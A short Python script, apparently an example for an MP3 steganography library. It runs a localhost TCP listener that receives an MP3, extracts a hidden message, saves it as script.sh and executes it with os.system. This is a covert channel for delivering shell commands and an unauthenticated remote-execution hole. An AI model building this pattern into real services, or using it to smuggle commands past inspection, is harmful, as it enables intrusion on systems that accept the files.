import os
import socket

from mp3stego import Steganography

HOST = "127.0.0.1"  # localhost
PORT = 65432  # Port to listen on


def receive_file():
    with conn:
        mp3file_content = b''
        while True:
            data = conn.recv(1024)
            mp3file_content += data
            if not data:
                break

    return mp3file_content


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    sock.listen()
    while True:
        conn, addr = sock.accept()
        with conn:
            print(f"Connected by {addr}")
            mp3file_content = receive_file()  # receive the mp3 file with the hidden script

        with open('file.mp3', 'wb') as mp3file:
            print('Saving mp3 file')
            mp3file.write(mp3file_content)
            s = Steganography(quiet=False)
            s.reveal_massage('file.mp3', 'msg.txt')  # reveal the script to the msg.txt file
            with open('msg.txt', 'r') as msg:
                script_content = msg.read()
                print('Hidden script:', script_content)
                print("#" * 20)
                with open('script.sh', 'w') as script:  # save the script as a shell file
                    script.write(script_content)

            os.system('sh script.sh')  # execute the hidden script on the server side
